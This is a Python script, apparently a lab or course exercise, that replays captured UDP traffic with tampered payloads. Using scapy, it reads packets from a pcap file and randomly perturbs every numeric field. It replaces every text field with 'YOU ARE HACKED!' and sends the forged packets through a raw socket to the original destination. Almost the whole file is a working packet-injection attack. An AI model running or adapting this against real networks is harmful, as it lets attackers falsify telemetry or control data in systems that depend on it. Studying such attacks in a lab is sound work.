"""
Before running this code:
1. download exteranl python library scapy by following the instruction described in
https://scapy.readthedocs.io/en/latest/installation.html
?page=RawCap
2. download Wireshark from https://www.wireshark.org/download.html
note: Wireshark is used to capture packets which transfer between the host and the agent
"""

from scapy.all import *
from socket import *
import string
import struct
import time
import random

# check if the string is numberical
def isNum(data):
    # ignore negative sign
    if data[0] == '-':
        data = data[1:]

    tmp_list = data.split('.')

    for tmp in tmp_list:
        if not tmp.isnumeric():
            return False
    
    return True

# parse UDP packet message to string list
def parseData(data):
    data_list = data.decode('utf-8').split(';')

    # each data pair is formatted as {arg:val}
    arg_list = []
    val_list = []

    for data in data_list:
        pair = data.split(':')
        arg_list.append(pair[0])
        val_list.append(pair[1])

    return arg_list,val_list

# encapsulate string lists to bytes
def encapData(args,vals):
    tmp = ''

    if len(args) == len(vals):
        for i in range(len(args)):
            tmp = tmp + args[i] + ':' + vals[i] + ';'
        tmp = tmp[0:len(tmp)-1]
    else:
        print('Size not equal!')
    
    return tmp


# send UDP packet to destination
def writeUDP(data,sport,dip,dport,length,chksum):
    s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)

    udp_header = struct.pack('!HHHH', sport, dport, length, chksum)
    s.sendto(udp_header + data, (dip, dport))

# main function
if __name__ == '__main__':

    # read captured packets
    pkts = rdpcap('sample_tar.pcap')

    counter = 1

    for pkt in pkts:
        # extract message from captured packet
        arg_list,val_list = parseData(pkt.load)

        # modify content of captured packet
        for i in range(len(val_list)):
            if isNum(val_list[i]):
                tmp = float(val_list[i])
                tmp += random.uniform(-5,5)
                val_list[i] = "{:.2f}".format(tmp)
            else:
                val_list[i] = "YOU ARE HACKED!"

        sip = pkt.src
        #sip_hex = hex
        dip = pkt.dst
        sport = pkt.sport
        dport = pkt.dport
        chksum = pkt[UDP].chksum

        # print info of captured packets
        print('\n=== Packet %d ===' %counter)
        print('Source: %s:%s' %(sip, sport))
        print('Destination: %s:%s' %(dip, dport))
        print('Checksum: %s' %chksum)
        print('Modified Content: ', arg_list, val_list)
        #print('Modified Content: ', arg_list, modify_num)

        # send modified packets back to original destination
        try: 
            msg = bytes(encapData(arg_list,val_list),'utf-8')
            writeUDP(msg,sport,dip,dport,8 + len(msg),0)
            print('\nSuccessfully sent modified packets %d to %s:%s\n' %(counter,dip,dport))
        except: 
            print('Error: did not sent modified packets')
        
        counter += 1
        time.sleep(1)